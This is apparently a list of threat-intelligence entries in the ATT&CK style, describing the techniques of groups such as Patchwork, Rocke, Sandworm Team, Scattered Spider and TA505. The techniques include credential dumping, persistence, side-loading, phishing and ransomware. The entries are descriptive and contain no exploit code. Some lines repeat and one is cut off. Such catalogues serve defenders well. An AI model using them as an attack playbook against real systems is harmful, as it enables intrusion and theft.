POLONIUM has created and used legitimate Microsoft OneDrive accounts for their operations.
PROMETHIUM has signed code with self-signed certificates.
PROMETHIUM has created self-signed certificates to sign malicious installers.
PROMETHIUM has created self-signed digital certificates for use in HTTPS C2 traffic.
PROMETHIUM has used watering hole attacks to deliver malicious versions of legitimate installers.
PROMETHIUM has created admin accounts on a compromised host.
PROMETHIUM has attempted to get users to execute compromised installation files for legitimate software including compression applications, security software, browsers, file recovery applications, and other tools and utilities.
PROMETHIUM has named services to appear legitimate.
PROMETHIUM has disguised malicious installer files by bundling them with legitimate software installers.
PROMETHIUM has used a script that configures the knockd service and firewall to only accept C2 connections from systems that use a specified sequence of knock ports.
PROMETHIUM has used Registry run keys to establish persistence.
PROMETHIUM has created new services and modified existing services for persistence.
Patchwork encrypted the collected files' path with AES and then encoded them with base64.
Patchwork developed a file stealer to search C:\ and collect files with certain extensions. Patchwork also executed a script to enumerate all drives, store them as a list, and upload generated files to the C2 server.
Patchwork has used BITS jobs to download malicious payloads.
Patchwork apparently altered NDiskMonitor samples by adding four bytes of random letters in a likely attempt to change the file hashes.
Patchwork bypassed User Access Control (UAC).
Patchwork has signed malware with self-signed certificates from fictitious and spoofed legitimate software companies.
Patchwork has created self-signed certificates from fictitious and spoofed legitimate software companies that were later used to sign malware.
Patchwork has obfuscated a script with Crypto Obfuscator.
Patchwork dumped the login data database from &lt;code&gt;\AppData\Local\Google\Chrome\User Data\Default\Login Data&lt;/code&gt;.
A Patchwork .dll that contains BADNEWS is loaded and executed using DLL side-loading.
Patchwork collected and exfiltrated files from the infected system.
Patchwork hides base64-encoded and encrypted C2 server locations in comments on legitimate websites.
Patchwork has used watering holes to deliver files with exploits to initial victims.
Patchwork leveraged the DDE protocol to deliver their malware.
Patchwork uses malicious documents to deliver remote execution exploits as part of. The group has previously exploited CVE-2017-8570, CVE-2012-1856, CVE-2014-4114, CVE-2017-0199, CVE-2017-11882, and CVE-2015-1641.
Patchwork removed certain files and replaced them so they could not be retrieved.
A Patchwork payload has searched all fixed drives on the victim for files matching a specified list of extensions.
Patchwork apparently altered NDiskMonitor samples by adding four bytes of random letters in a likely attempt to change the file hashes.
Patchwork payloads download additional files from the C2 server.
Patchwork copied all targeted files to a directory called index that was eventually uploaded to the C&amp;C server.
Patchwork embedded a malicious macro in a Word document and lured the victim to click on an icon to execute the malware.
Patchwork has used spearphishing with links to try to get users to click, download and open malicious files.
Patchwork installed its payload in the startup programs folder as "Baidu Software Update." The group also adds its second stage payload to the startup programs as “Net Monitor." They have also dropped QuasarRAT binaries as files named microsoft_network.exe and crome.exe.
A Patchwork payload deletes Resiliency Registry keys created by Microsoft Office applications in an apparent effort to trick users into thinking there were no issues during application runs.
Patchwork used PowerSploit to download payloads, run a reverse shell, and execute malware on the victim's machine.
A Patchwork payload uses process hollowing to hide the UAC bypass vulnerability exploitation inside svchost.exe.
Patchwork has added the path of its second-stage malware to the startup folder to achieve persistence. One of its file stealers has also persisted by adding a Registry Run key.
Patchwork attempted to use RDP to move laterally.
A Patchwork file stealer can run a TaskScheduler DLL to add persistence.
Patchwork scanned the “Program Files” directories for a directory with the string “Total Security” (the installation path of the “360 Total Security” antivirus tool).
A Patchwork payload was packed with UPX.
Patchwork has used spearphishing with an attachment to deliver files with exploits to initial victims.
Patchwork has used spearphishing with links to deliver files with exploits to initial victims.
Patchwork has used embedded image tags (known as web bugs) with unique, per-recipient tracking links in their emails for the purpose of identifying which recipients opened messages.
Patchwork used Base64 to encode C2 traffic.
Patchwork collected the victim computer name, OS version, and architecture type and sent the information to its C2 server. Patchwork also enumerated all available drives on the victim's machine.
Patchwork collected the victim username and whether it was running as admin, then sent the information to its C2 server.
Patchwork has obtained and used open-source tools such as QuasarRAT.
Patchwork used Visual Basic Scripts (VBS) on victim machines.
Patchwork ran a reverse shell with Meterpreter. Patchwork used JavaScript code and .SCT files on victim machines.
PittyTiger has obtained and used tools such as Mimikatz and gsecdump.
PittyTiger attempts to obtain legitimate credentials during operations.
Poseidon Group searches for administrator accounts on both the local victim machine and the network.
Poseidon Group searches for administrator accounts on both the local victim machine and the network.
Poseidon Group tools attempt to spoof anti-virus processes as a means of self-defense.
Poseidon Group conducts credential dumping on victims, with a focus on obtaining credentials belonging to domain and database servers.
The Poseidon Group's Information Gathering Tool (IGT) includes PowerShell components.
After compromising a victim, Poseidon Group lists all running processes.
Poseidon Group obtains and saves information about victim network interfaces and addresses.
After compromising a victim, Poseidon Group discovers all running services.
Malware used by Putter Panda attempts to terminate processes corresponding to two components of Sophos Anti-Virus (SAVAdminService.exe and SavService.exe).
An executable dropped onto victims by Putter Panda aims to inject the specified DLL into a process that would normally be accessing the network, including Outlook Express (msinm.exe), Outlook (outlook.exe), Internet Explorer (iexplore.exe), and Firefox (firefox.exe).
Droppers used by Putter Panda use RC4 or a 16-byte XOR key consisting of the bytes 0xA0 – 0xAF to obfuscate payloads.
A dropper used by Putter Panda installs itself into the ASEP Registry key &lt;code&gt;HKCU\Software\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt; with a value named McUpdate.
RTM has used search order hijacking to force TeamViewer to load a malicious DLL.
RTM has used an RSS feed on Livejournal to update a list of encrypted C2 server names.
RTM has distributed its malware via the RIG and SUNDOWN exploit kits, as well as online advertising network &lt;code&gt;Yandex.Direct&lt;/code&gt;.
RTM has attempted to lure victims into opening e-mail attachments to execute malicious code.
RTM has used Registry run keys to establish persistence for the RTM Trojan and other tools, such as a modified version of TeamViewer remote desktop software.
RTM has used a modified version of TeamViewer and Remote Utilities for remote access.
RTM has used spearphishing attachments to distribute its malware.
Rancor has downloaded additional malware, including by using certutil.
Rancor attempted to get users to click on an embedded macro within a Microsoft Office Excel document to launch their malware.
Rancor has used &lt;code&gt;msiexec&lt;/code&gt; to download and execute malicious installer files over HTTP.
Rancor launched a scheduled task to gain persistence using the &lt;code&gt;schtasks /create /sc&lt;/code&gt; command.
Rancor has attached a malicious document to an email to gain initial access.
Rancor has used VBS scripts as well as embedded macros for execution.
Rancor has used HTTP for C2.
Rancor has used cmd.exe to execute commmands.
Rancor has complied VBScript-generated MOF files into WMI event subscriptions for persistence.
Rocke issued wget requests from infected systems to the C2.
Rocke has installed an "init.d" startup script to maintain persistence.
Rocke has cleared log files within the /var/log/ folder.
Rocke has compiled malware, delivered to victims as .c files, with the GNU Compiler Collection (GCC).
Rocke installed a cron job that downloaded and executed files from the C2.
Rocke has used Pastebin to check the version of beaconing malware and redirect to another Pastebin hosting updated malware.
Rocke has extracted tar.gz files after downloading them from a C2 server.
Rocke used scripts which killed processes and added firewall rules to block traffic related to other cryptominers.
Rocke used scripts which detected and uninstalled antivirus software.
Rocke has modified /etc/ld.so.preload to hook libc functions in order to hide the installed dropper and mining software in process lists.
Rocke exploited Apache Struts, Oracle WebLogic (CVE-2017-10271), and Adobe ColdFusion (CVE-2017-3066) vulnerabilities to deliver malware.
Rocke has deleted files on infected machines.
Rocke downloaded a file "libprocesshider", which could hide files on the target system.
Rocke used malware to download additional malicious files to the target system.
Rocke has changed file permissions of files so they could not be modified.
Rocke has used shell scripts which download mining executables and saves them with the filename "java".
Rocke conducted scanning for exposed TCP port 7001 as well as SSH and Redis servers.
Rocke's miner connects to a C2 server using port 51640.
Rocke has modified UPX headers after packing files to break unpackers.
Rocke's miner, "TermsHost.exe", evaded defenses by injecting itself into Windows processes, including Notepad.exe.
Rocke has used SSH private keys on the infected machine to spread its coinminer throughout a network.
Rocke can detect a running process's PID on the infected machine.
Rocke has used Python-based malware to install and spread their coinminer.
Rocke's miner has created UPX-packed files in the Windows Start Menu Folder.
Rocke has looked for IP addresses in the known_hosts file on the infected system and attempted to SSH into them.
Rocke has distributed cryptomining malware.
Rocke has modified /etc/ld.so.preload to hook libc functions in order to hide the installed dropper and mining software in process lists.
Rocke has spread its coinminer via SSH.
Rocke used scripts which detected and uninstalled antivirus software.
Rocke's miner has created UPX-packed files in the Windows Start Menu Folder.
Rocke has used uname -m to collect the name and information about the infected system's kernel.
Rocke has installed a systemd service script to maintain persistence.
Rocke has changed the time stamp of certain files.
Rocke used shell scripts to run commands which would obtain persistence and execute the cryptocurrency mining malware.
Rocke has executed wget and curl commands to Pastebin over the HTTPS protocol.
Rocke has used Pastebin, Gitee, and GitLab for Command and Control.
Sandworm Team used various third-party email campaign management services to deliver phishing emails.
Sandworm Team has used the Telegram Bot API from Telegram Messenger to send and receive commands to its Python backdoor. Sandworm Team also used legitimate M.E.Doc software update check requests for sending and receiving commands and hosted malicious payloads on putdrive.com.
Sandworm Team has used a large-scale botnet to target Small Office/Home Office (SOHO) network devices.
In preparation for its attack against the 2018 Winter Olympics, Sandworm Team conducted online research of partner organizations listed on an official PyeongChang Olympics partnership site.
Sandworm Team has used ROT13 encoding, AES encryption and compression with the zlib library for their Python-based backdoor.
Sandworm Team has distributed NotPetya by compromising the legitimate Ukrainian accounting software M.E.Doc and replacing a legitimate software update with a malicious one.
Sandworm Team's CredRaptor tool can collect saved passwords from various internet browsers.
Sandworm Team has used the BlackEnergy KillDisk component to overwrite files on Windows-based Human-Machine Interfaces.
Sandworm Team has used Prestige ransomware to encrypt data at targeted organizations in transportation and related logistics industries in Ukraine and Poland.
Sandworm Team exfiltrates data of interest from enterprise databases using Adminer.
Sandworm Team has exfiltrated internal documents, files, and other data from compromised hosts.
Sandworm Team's VBS backdoor can decode Base64-encoded data and save it to the %TEMP% folder. The group also decrypted received information using the Triple DES algorithm and decompresses it using GZip.
Sandworm Team has used the BlackEnergy KillDisk component to corrupt the infected system's master boot record.
Sandworm Team has used a tool to query Active Directory using LDAP, discovering information about usernames listed in AD.
Sandworm Team has used stolen credentials to access administrative accounts within the domain.
Sandworm Team conducted technical reconnaissance of the Parliament of Georgia's official internet domain prior to its 2019 attack.
Sandworm Team has registered domain names and created URLs that are often designed to mimic or spoof legitimate websites, such as email login pages, online file sharing and storage websites, and password reset pages, while also hosting these items on legitimate, compromised network infrastructure.
Sandworm Team used malware to enumerate email settings, including usernames and passwords, from the M.E.Doc application.
Sandworm Team has created email accounts that mimic legitimate organizations for its spearphishing operations.
Sandworm Team has obtained valid emails addresses while conducting research against target organizations that were subsequently used in spearphishing campaigns.
Sandworm Team's research of potential victim organizations included the identification and collection of employee information.
Sandworm Team temporarily disrupted service to Georgian government, non-government, and private sector websites after compromising a Georgian web hosting provider in 2019.
Sandworm Team has sent system information to its C2 server using HTTP.
Sandworm Team exploits public-facing applications for initial access and to acquire infrastructure, such as exploitation of the EXIM mail transfer agent in Linux systems.
Sandworm Team has exploited vulnerabilities in Microsoft PowerPoint via OLE objects (CVE-2014-4114) and Microsoft Word via crafted TIFF images (CVE-2013-3906).
Sandworm Team defaced approximately 15,000 websites belonging to Georgian government, non-government, and private sector organizations in 2019.
Sandworm Team has used Dropbear SSH with a hardcoded backdoor password to maintain persistence within the target network. Sandworm Team has also used VPN tunnels established in legitimate software company infrastructure to gain access to internal networks of that software company's users.
Sandworm Team has used backdoors that can delete files used in an attack from an infected system.
Sandworm Team has enumerated files on a compromised host.
Sandworm Team has pushed additional malicious tools onto an infected system to steal user credentials, move laterally, and destroy data.
Sandworm Team has used a keylogger to capture keystrokes by using the SetWindowsHookEx function.
Sandworm Team has used its plainpwd tool, a modified version of Mimikatz, and comsvcs.dll to dump Windows credentials from system memory.
Sandworm Team has used `move` to transfer files to a network share and has copied payloads--such as Prestige ransomware--to an Active Directory Domain Controller and distributed via the Default Domain Group Policy Object.
Sandworm Team has tricked unwitting recipients into clicking on spearphishing attachments and enabling malicious macros embedded within files.
Sandworm Team has tricked unwitting recipients into clicking on malicious hyperlinks within emails crafted to resemble trustworthy senders.
Sandworm Team has developed malware for its operations, including malicious mobile applications and destructive malware such as NotPetya and Olympic Destroyer.
Sandworm Team masqueraded malicious installers as Windows update packages to evade defense and entice users to execute binaries.
Sandworm Team has avoided detection by naming a malicious binary explorer.exe.
Sandworm Team has used `ntdsutil.exe` to back up the Active Directory database, likely for credential access.
Sandworm Team has used intercepter-NG to sniff passwords in network traffic.
Sandworm Team has used port 6789 to accept connections on the group's SSH server.
Sandworm Team has used Base64 encoding within malware variants.
Sandworm Team has used PowerShell scripts to run a credential harvesting tool in memory to evade defenses.
Sandworm Team's BCS-server tool can create an internal proxy server to redirect traffic from the adversary-controlled C2 to internal servers which may not be connected to the internet, but are interconnected locally.
Sandworm Team has used remote administration tools or remote industrial control system client software for execution and to maliciously release electricity breakers.
Sandworm Team has used a tool to query Active Directory using LDAP, discovering information about computers listed in AD.
Sandworm Team used a backdoor which could execute a supplied DLL using rundll32.exe.
Sandworm Team has copied payloads to the `ADMIN$` share of remote systems and run &lt;code&gt;net use&lt;/code&gt; to connect to network shares.
Sandworm Team researched Ukraine's unique legal entity identifier (called an "EDRPOU" number), including running queries on the EDRPOU website, in preparation for the NotPetya attack. Sandworm Team has also researched third-party websites to help it craft credible spearphishing emails.
Sandworm Team has conducted research against potential victim websites as part of its operational planning.
Sandworm Team has leased servers from resellers instead of leasing infrastructure directly from hosting companies to enable its operations.
Sandworm Team compromised legitimate Linux servers running the EXIM mail transfer agent for use in subsequent campaigns.
Sandworm Team creates credential capture webpages to compromise existing, legitimate social media accounts.
Sandworm Team has established social media accounts to disseminate victim internal-only documents and other sensitive data.
Sandworm Team has researched software code to enable supply-chain operations, most notably for the 2017 NotPetya attack. Sandworm Team also collected a list of computers using specific software as part of its targeting efforts.
Sandworm Team has used the commercially available tool RemoteExec for agentless remote code execution.
Sandworm Team has delivered malicious Microsoft Office attachments via spearphishing emails.
Sandworm Team has crafted phishing emails containing malicious hyperlinks.
Sandworm Team has crafted spearphishing emails with hyperlinks designed to trick unwitting recipients into revealing their account credentials.
Sandworm Team's BCS-server tool uses base64 encoding and HTML tags for the communication traffic between the C2 server.
Sandworm Team used information stealer malware to collect browser session cookies.
Sandworm Team used a backdoor to enumerate information about the infected system's operating system.
Sandworm Team had gathered user, IP address, and server data related to RDP sessions on a compromised host. It has also accessed network diagram files useful for understanding how a host's network was configured.
Sandworm Team has collected the username from a compromised host.
Sandworm Team has acquired open-source tools for their operations, including Invoke-PSImage, which was used to establish an encrypted channel from a compromised host to Sandworm Team's C2 server in preparation for the 2018 Winter Olympics attack, as well as Impacket and RemoteExec, which were used in their 2022 Prestige operations.
Sandworm Team has used dedicated network connections from one victim organization to gain unauthorized access to a separate organization.
Sandworm Team have used previously acquired legitimate credentials prior to attacks.
Sandworm Team has created VBScripts to run an SSH server.
In 2017, Sandworm Team conducted technical research related to vulnerabilities associated with websites used by the Korean Sport and Olympic Committee, a Korean power company, and a Korean airport.
Sandworm Team has scanned network infrastructure for vulnerabilities as part of its operational planning.
Sandworm Team's BCS-server tool connects to the designated C2 server via HTTP.
Sandworm Team has used webshells including P.A.S. Webshell to maintain access to victim networks.
Sandworm Team has used Impacket’s WMIexec module for remote code execution and VBScript to run WMI queries.
Scarlet Mimic has used the left-to-right override character in self-extracting RAR archive spearphishing attachment file names.
During C0027, Scattered Spider used IAM manipulation to gain persistence and to assume or elevate privileges.

Scattered Spider has also assigned user access admin roles in order to gain Tenant Root Group management permissions in Azure.
Scattered Spider retrieves browser histories via infostealer malware such as Raccoon Stealer.
Scattered Spider enumerates cloud environments to identify server and backup management infrastructure, resource access, databases and storage containers.
Scattered Spider abused AWS Systems Manager Inventory to identify targets on the compromised network prior to lateral movement.
During C0027, Scattered Spider used compromised Azure credentials for credential theft activity and lateral movement to on-premises systems.

Scattered Spider has also leveraged pre-existing AWS EC2 instances for lateral movement and data collection purposes.
Scattered Spider enumerates data stored within victim code repositories, such as internal GitHub repositories.
Scattered Spider has used self-signed and stolen certificates originally issued to NVIDIA and Global Software LLC.
Scattered Spider has added additional trusted locations to Azure AD conditional access policies.
Scattered Spider creates new user identities within the compromised organization.
During C0027, Scattered Spider used access to the victim's Azure tenant to create Azure VMs.

Scattered Spider has also created Amazon EC2 instances within the victim's environment.
Scattered Spider Spider searches for credential storage documentation on a compromised host.
Scattered Spider has used BlackCat ransomware to encrypt files on VMWare ESXi servers.
Scattered Spider stages data in a centralized database prior to exfiltration.
Scattered Spider enumerates data stored in cloud resources for collection and exfiltration purposes.
Scattered Spider has created volume shadow copies of virtual domain controller disks to extract the `NTDS.dit` file.
Scattered Spider leverages legitimate domain accounts to gain access to the target environment.
Scattered Spider creates inbound rules on the compromised email accounts of security personnel to automatically delete emails from vendor security products.
Scattered Spider has exfiltrated victim data to the MEGA file sharing site.
Scattered Spider has deployed a malicious kernel driver through exploitation of CVE-2015-2291 in the Intel Ethernet diagnostics driver for Windows (iqvw64.sys).
Scattered Spider has leveraged legitimate remote management tools to maintain persistent access.
Scattered Spider Spider enumerates a target organization for files and directories of interest, including source code.
Scattered Spider has deployed ransomware on compromised hosts for financial gain.
During C0027, Scattered Spider impersonated legitimate IT personnel in phone calls and text messages either to direct victims to a credential harvesting site or getting victims to run commercial remote monitoring and management (RMM) tools.

Scattered Spider utilized social engineering to compel IT help desk personnel to reset passwords and MFA tokens.
After compromising user accounts, Scattered Spider registers their own MFA tokens.
Scattered Spider has used multifactor authentication (MFA) fatigue by sending repeated MFA authentication requests to targets.
Scattered Spider has extracted the `NTDS.dit` file by creating volume shadow copies of virtual domain controller disks.
Scattered Spider has used a combination of credential phishing and social engineering to capture one-time-password (OTP) codes.
Scattered Spider enumerate and exfiltrate code-signing certificates from a compromised host.
During C0027, Scattered Spider directed victims to run remote monitoring and management (RMM) tools.

In addition to directing victims to run remote software, Scattered Spider members themselves also deploy RMM software including AnyDesk, LogMeIn, and ConnectWise Control to establish persistence on the compromised network.
Scattered Spider can enumerate remote systems, such as VMware vCenter infrastructure.
During C0027, Scattered Spider used phone calls to instruct victims to navigate to credential-harvesting websites.

Scattered Spider has also called employees at target organizations and compelled them to navigate to fake login portals using adversary-in-the-middle toolkits.
Scattered Spider retrieves browser cookies via Raccoon Stealer.
Scattered Spider adds a federated identity provider to the victim’s SSO tenant and activates automatic account linking.
Scattered Spider has impersonated organization IT and helpdesk staff to instruct victims to execute commercial remote access tools to gain initial access.
SideCopy has used a malicious loader DLL file to execute the `credwiz.exe` process and side-load the malicious payload `Duser.dll`.
SideCopy has compromised domains for some of their infrastructure, including for C2 and staging malware.
SideCopy has delivered trojanized executables via spearphishing emails that contacts actor-controlled servers to download malicious payloads.
SideCopy has attempted to lure victims into clicking on malicious embedded archive files sent via spearphishing campaigns.
SideCopy has used a legitimate DLL file name, `Duser.dll` to disguise a malicious remote access tool.
SideCopy has utilized `mshta.exe` to execute a malicious hta file.
SideCopy has executed malware by calling the API function `CreateProcessW`.
SideCopy uses a loader DLL file to collect AV product names from an infected host.
SideCopy has collected browser information from a compromised host.
SideCopy has sent spearphishing emails with malicious hta file attachments.
SideCopy has crafted generic lures for spam campaigns to collect emails and credentials for targeting efforts.
SideCopy has identified the OS version of a compromised host.
SideCopy has identified the country location of a compromised host.
SideCopy has identified the IP address of a compromised host.
SideCopy has used compromised domains to host its malicious payloads.
SideCopy has sent Microsoft Office Publisher documents to victims that have embedded malicious macros that execute an hta file via calling `mshta.exe`.
Sidewinder has used tools to automatically collect system and network configuration information.
Sidewinder has configured tools to automatically send collected files to attacker controlled servers.
Sidewinder has used base64 encoding for scripts.
Sidewinder has used DLL side-loading to drop and execute malicious payloads including the hijacking of the legitimate Windows application file rekeywiz.exe.
Sidewinder has used the ActiveXObject utility to create OLE objects to obtain execution through Internet Explorer.
Sidewinder has used base64 encoding and ECDH-P256 encryption for payloads.
Sidewinder has exploited vulnerabilities to gain execution including CVE-2017-11882 and CVE-2020-0674.
Sidewinder has used malware to collect information on files and directories.
Sidewinder has used LNK files to download remote files to the victim's network.
Sidewinder has used JavaScript to drop and execute malware loaders.
Sidewinder has collected stolen files in a temporary folder in preparation for exfiltration.
Sidewinder has lured targets to click on malicious files to gain execution in the target environment.
Sidewinder has lured targets to click on malicious links to gain execution in the target environment.
Sidewinder has named malicious files &lt;code&gt;rekeywiz.exe&lt;/code&gt; to match the name of a legitimate Windows executable.
Sidewinder has used &lt;code&gt;mshta.exe&lt;/code&gt; to execute malicious payloads.
Sidewinder has used PowerShell to drop and execute malware loaders.
Sidewinder has used tools to identify running processes on the victim's machine.
Sidewinder has added paths to executables in the Registry to establish persistence.
Sidewinder has used the Windows service &lt;code&gt;winmgmts:\\.\root\SecurityCenter2&lt;/code&gt; to check installed antivirus products.
Sidewinder has used tools to enumerate software installed on an infected host.
Sidewinder has sent e-mails with malicious attachments often crafted for specific targets.
Sidewinder has sent e-mails with malicious attachments that lead victims to credential harvesting websites.
Sidewinder has sent e-mails with malicious links often crafted for specific targets.
Sidewinder has sent e-mails with malicious links to credential harvesting websites.
Sidewinder has used tools to collect the computer name, OS version, installed hotfixes, as well as information regarding the memory and processor on a compromised host.
Sidewinder has used malware to collect information on network interfaces, including the MAC address.
Sidewinder has used tools to identify the user of a compromised host.
Sidewinder has used tools to obtain the current system time.
Sidewinder has used VBScript to drop and execute malware loaders.
Sidewinder has used HTTP in C2 communications.
Silence has used a valid certificate to sign their primary loader Silence.Downloader (aka TrueBot).
Silence has used environment variable string substitution for obfuscation.
Silence has weaponized CHM files in their phishing campaigns.
Silence has used ProxyBot, which allows the attacker to redirect traffic from the current node to the backconnect server via Sock4\Socks5.
Silence has deleted artifacts, including scheduled tasks, communicates files from the C2 and other logs.
Silence has downloaded additional modules and malware to victim’s machines.
Silence has used JS scripts.
Silence has used the Farse6.1 utility (based on Mimikatz) to extract credentials from lsass.exe.
Silence attempts to get users to launch malicious attachments delivered via spearphishing emails.
Silence has named its backdoor "WINWORD.exe".
Silence can create, delete, or modify a specified Registry key or value.
Silence has leveraged the Windows API, including using CreateProcess() or ShellExecute(), to perform a variety of tasks.
Silence has used port 444 when sending data about the system from the client to the server.
Silence has used PowerShell to download and execute payloads.
Silence has injected a DLL library containing a Trojan into the fwmain32.exe process.
Silence has used &lt;code&gt;HKCU\Software\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt;, &lt;code&gt;HKLM\Software\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt;, and the Startup folder to establish persistence.
Silence has used RDP for lateral movement.
Silence has used Nmap to scan the corporate network, build a network topology, and identify vulnerable hosts.
Silence has used scheduled tasks to stage its operation.
Silence can capture victim screen activity.
Silence has used Winexe to install a service on the remote system.
Silence has used RAdmin, a remote software tool used to remotely control workstations and ATMs.
Silence has sent emails with malicious DOCX, CHM, LNK and ZIP attachments.
Silence has obtained and modified versions of publicly-available tools like Empire and PsExec.
Silence has used compromised credentials to log on to other systems and escalate privileges.
Silence has been observed making videos of victims to observe bank employees day to day activities.
Silence has used VBS scripts.
Silence has used Windows command-line to run commands.
Silent Librarian has obtained free Let's Encrypt SSL certificates for use on their phishing pages.
Silent Librarian has acquired domains to establish credential harvesting pages, often spoofing the target organization and using free top level domains .TK, .ML, .GA, .CF, and .GQ.
Silent Librarian has established e-mail accounts to receive e-mails forwarded from compromised accounts.
Silent Librarian has collected e-mail addresses from targeted organizations from open Internet searches.
Silent Librarian has exfiltrated entire mailboxes from compromised accounts.
Silent Librarian has set up auto forwarding rules on compromised e-mail accounts.
Silent Librarian has collected lists of names for individuals from targeted organizations.
Silent Librarian has cloned victim organization login pages and staged them for later use in credential harvesting campaigns. Silent Librarian has also made use of a variety of URL shorteners for these staged websites.
Silent Librarian has used collected lists of names and e-mail accounts to use in password spraying attacks against private sector targets.
Silent Librarian has searched victim's websites to identify the interests and academic areas of targeted individuals and to scrape source code, branding, and organizational contact information for phishing pages.
Silent Librarian has used links in e-mails to direct victims to credential harvesting websites designed to appear like the targeted organization's login page.
Silent Librarian has obtained free and publicly available tools including SingleFile and HTTrack to copy login pages of targeted organizations.
Silent Librarian has used compromised credentials to obtain unauthorized access to online accounts.
SilverTerrier uses FTP for C2 communications.
SilverTerrier targets organizations in high technology, higher education, and manufacturing for business email compromise (BEC) campaigns with the goal of financial theft.
SilverTerrier uses SMTP for C2 communications.
SilverTerrier uses HTTP for C2 communications.
Sowbug extracted documents and bundled them into a RAR archive.
Sowbug extracted Word documents from a file server on a victim network.
Sowbug identified and extracted all Word documents on a server by using a command containing * .doc and *.docx. The actors also searched for documents based on a specific date range and attempted to identify all installed software on a victim.
Sowbug has used keylogging tools.
Sowbug named its tools to masquerade as Windows or Adobe Reader software, such as by using the file name adobecms.exe and the directory &lt;code&gt;CSIDL_APPDATA\microsoft\security&lt;/code&gt;.
Sowbug listed remote shared drives that were accessible from a victim.
Sowbug has used credential dumping tools.
Sowbug obtained OS version and hardware configuration from a victim.
Sowbug has used command line during its intrusions.
Stealth Falcon malware uses WMI to script data collection and command execution on the victim.
Stealth Falcon malware gathers passwords from multiple sources, including Windows Credential Vault and Outlook.
Stealth Falcon malware gathers passwords from multiple sources, including Internet Explorer, Firefox, and Chrome.
Stealth Falcon malware gathers data from the local victim system.
After data is collected by Stealth Falcon malware, it is exfiltrated over the existing C2 channel.
Stealth Falcon malware uses PowerShell commands to perform various functions, including gathering system information via WMI and executing commands from its C2 server.
Stealth Falcon malware gathers a list of running processes.
Stealth Falcon malware attempts to determine the installed version of .NET by querying the Registry.
Stealth Falcon malware creates a scheduled task entitled “IE Web Cache” to execute a malicious file hourly.
Stealth Falcon malware encrypts C2 traffic using RC4 with a hard-coded key.
Stealth Falcon malware gathers system information via WMI, including the system directory, build number, serial number, version, manufacturer, model, and total physical memory.
Stealth Falcon malware gathers the Address Resolution Protocol (ARP) table from the victim.
Stealth Falcon malware gathers the registered user and primary owner name via WMI.
Stealth Falcon malware communicates with its C2 server via HTTPS.
Stealth Falcon malware gathers passwords from the Windows Credential Vault.
Stealth Falcon malware gathers system information via Windows Management Instrumentation (WMI).
Strider has used a hidden file system that is stored as a file on disk.
Strider has used local servers with both local network and Internet access to act as internal proxy nodes to exfiltrate data from other parts of the network without direct Internet access.
Strider has registered its persistence module on domain controllers as a Windows LSA (Local System Authority) password filter to acquire credentials any time a domain, local user, or administrator logs in or changes a password.
Suckfly has used stolen certificates to sign its malware.
Suckfly the victim's internal network for hosts with ports 8080, 5900, and 40 open.
Suckfly used a signed credential-dumping tool to obtain victim account credentials.
Suckfly used legitimate account credentials that they dumped to navigate the internal victim network as though they were the legitimate account owner.
Several tools used by Suckfly have been command-line driven.
TA2541 has used TLS encrypted C2 communications including for campaigns using AsyncRAT.
TA2541  has attempted to disable built-in security protections such as Windows AMSI.
TA2541 has registered domains often containing the keywords “kimjoy,” “h0pe,” and “grace,” using domain registrars including Netdorm and No-IP DDNS, and hosting providers including xTom GmbH and Danilenko, Artyom.
TA2541 has used dynamic DNS services for C2 infrastructure.
TA2541 has used compressed and char-encoded scripts in operations.
TA2541 has used malicious scripts and macros with the ability to download additional payloads.
TA2541 has run scripts to check internet connectivity from compromised hosts.
TA2541 has used macro-enabled MS Word documents to lure victims into executing malicious payloads.
TA2541 has used malicious links to cloud and web services to gain execution on victim machines.
TA2541 has used multiple strains of malware available for purchase on criminal forums or in open-source repositories.
TA2541 has used file names to mimic legitimate Windows files or system functionality.
TA2541 has used `mshta` to execute scripts including VBS.
TA2541 has used PowerShell to download files and to inject into various Windows processes.
TA2541 has used process hollowing to execute CyberGate malware.
TA2541 has injected malicious code into legitimate .NET related processes including  regsvcs.exe, msbuild.exe, and installutil.exe.
TA2541 has placed VBS files in the Startup folder and used Registry run keys to establish persistence for malicious payloads.
TA2541 has used scheduled tasks to establish persistence for installed tools.
TA2541 has used tools to search victim systems for security products such as antivirus and firewall software.
TA2541 has used a .NET packer to obfuscate malicious files.
TA2541 has sent phishing emails with malicious attachments for initial access including MS Word documents.
TA2541 has used spearphishing e-mails with malicious links to deliver malware.
TA2541 has collected system information prior to downloading malware on the targeted host.
TA2541 has used commodity remote access tools.
TA2541 has uploaded malware to various platforms including Google Drive, Pastetext, Sharetext, and GitHub.
TA2541 has used VBS files to execute or establish persistence for additional payloads, often using file names consistent with email themes or mimicking system functionality.
TA2541 has hosted malicious files on various platforms including Google Drive, OneDrive, Discord, PasteText, ShareText, and GitHub.
TA2541 has used WMI to query targeted systems for security products.
TA459 has exploited Microsoft Word vulnerability CVE-2017-0199 for execution.
TA459 has attempted to get victims to open malicious Microsoft Word attachment sent via spearphishing.
TA459 has used PowerShell for execution of a payload.
TA459 has targeted victims using spearphishing emails with malicious Microsoft Word attachments.
TA459 has a VBScript for execution.
TA505 has signed payloads with code signing certificates from Thawte and Sectigo.
TA505 has used base64 encoded PowerShell commands.
TA505 has used malware to gather credentials from FTP clients and Outlook.
TA505 has used malware to gather credentials from Internet Explorer.
TA505 has used a wide variety of ransomware, such as Clop, Locky, Jaff, Bart, Philadelphia, and GlobeImposter, to encrypt victim files and demand a ransom payment.
TA505 has decrypted packed DLLs with an XOR key.
TA505 has used malware to disable Windows Defender.
TA505 has used stolen domain admin accounts to compromise additional hosts.
TA505 has registered domains to impersonate services such as Dropbox to distribute malware.
TA505 has leveraged malicious Word documents that abused DDE.
TA505 has been seen injecting a DLL into winword.exe.
TA505 has used the tool EmailStealer to steal and send lists of e-mail addresses to a remote server.
TA505 has password-protected malicious Word documents.
TA505 has used fast flux to mask botnets by distributing payloads across multiple IPs.
TA505 has downloaded additional malware to execute on victim systems.
TA505 has used JavaScript for code execution.
TA505 has used lures to get users to enable content in malicious attachments and execute malicious files contained in archives. For example, TA505 makes their malware look like legitimate Microsoft Word documents, .pdf and/or .lnk files.
TA505 has used lures to get users to click links in emails and attachments. For example, TA505 makes their malware look like legitimate Microsoft Word documents, .pdf and/or .lnk files.
TA505 has used malware such as Azorult and Cobalt Strike in their operations.
TA505 has used .iso files to deploy malicious .lnk files.
TA505 has used malware to disable Windows Defender through modification of the Registry.
TA505 has used &lt;code&gt;msiexec&lt;/code&gt; to download and execute malicious Windows Installer files.
